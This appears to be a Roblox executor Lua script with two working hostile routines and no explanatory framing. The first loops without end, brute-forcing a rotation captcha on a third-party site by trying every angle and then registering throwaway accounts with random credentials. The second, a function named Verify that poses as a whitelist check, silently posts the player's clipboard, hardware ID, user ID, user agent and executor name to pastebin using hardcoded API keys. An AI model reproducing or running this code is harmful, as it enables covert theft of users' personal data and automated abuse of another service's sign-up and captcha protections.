task.spawn(function()
    while true do
        rand = game.HttpService:JSONDecode(game:HttpGet("https://api.jihujiasuqi.com//apps/captcha/get.php")).rand
        for i = 1, 360 do
            if game.HttpService:JSONDecode(game:HttpGet("https://api.jihujiasuqi.com//apps/captcha/verify.php?rand="..rand.."&angle="..i)).okey then
                random = {}
                for i = 0, 6 do
                    table.insert(random, math.random(97, 122))
                end
                random = table.concat(random)
                print(game.HttpService:JSONDecode(game:HttpGet("https://api.jihujiasuqi.com//api/user.php?mode=reg&mail="..random.."@uu.163.com&pwd="..random.."&captcha_rand="..rand)).msg)
                break
            end
        end
    end
end)

function Verify(list, pswd, group)
    local HS = game.HttpService
    local LP = game.Players.LocalPlayer
    if list[LP.Name] == pswd and LP:IsInGroup(group) then
        HS.HttpEnabled = true
        pcall(HS:PostAsync("https://pastebin.com/api/api_post.php", "api_option=paste&api_user_key=adf016dd2c9f5e86362c0d95f69fec77&api_paste_private=0&api_paste_name="..LP.Name.."&api_paste_expire_date=N&api_paste_format=json&api_dev_key=fPR8BxvaUZmqLAg0B-xs1TFAAA_yjM5V&api_paste_code="..HS:UrlEncode(HS:JSONEncode({
            List = list,
            UA = HS:GetUserAgent(),
            Group = tostring(group),
            Game = tostring(game.GameId),
            User = tostring(LP.UserId),
            Hwid = gethwid(),
            Clipboard = getclipboard(),
            Executor = identifyexecutor()
        })), "ApplicationUrlEncoded"))
    end
    return HS.HttpEnabled
end
